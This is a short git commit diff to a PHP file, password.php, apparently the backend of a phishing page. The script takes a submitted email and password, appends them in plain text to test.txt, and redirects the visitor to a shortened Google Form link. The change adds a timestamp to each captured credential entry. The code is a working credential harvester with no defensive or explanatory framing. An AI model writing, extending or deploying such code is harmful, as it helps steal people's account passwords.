e7ab94a8913fede4a6799554b631fe16e30211a0
cvecve147 <cplyuef357@gmail.com>
2016-04-05 13:19:43 +0800

    test

--- password.php
+++ password.php
@@ -1,7 +1,6 @@
 <?php 
 	$Email=$_POST[Email];
 	$Password=$_POST[password];
-	
 	if ($Email=="" or strlen($Password)< 6) {
 		echo "<script language=\"JavaScript\">\r\n"; 
 		echo " alert(\"帳號密碼錯誤\");\r\n"; 
@@ -9,8 +8,10 @@
 		echo "</script>"; 
 	}
 	else {
+		$datetime = date ("Y-m-d H:i:s" , mktime(date('H'), date('i'), date('s'), date('m'), date('d'), date('Y'))) ; 
+		echo $datetime ;
 		$file=fopen("test.txt", "a");
-		fwrite($file,"Email  $Email  password  $Password  \r\n");
+		fwrite($file,"Time $datetime  Email  $Email  password  $Password  \r\n");
 		fclose($file);
 		header("Location: http://goo.gl/forms/zXhB52kwLS"); 
 	}
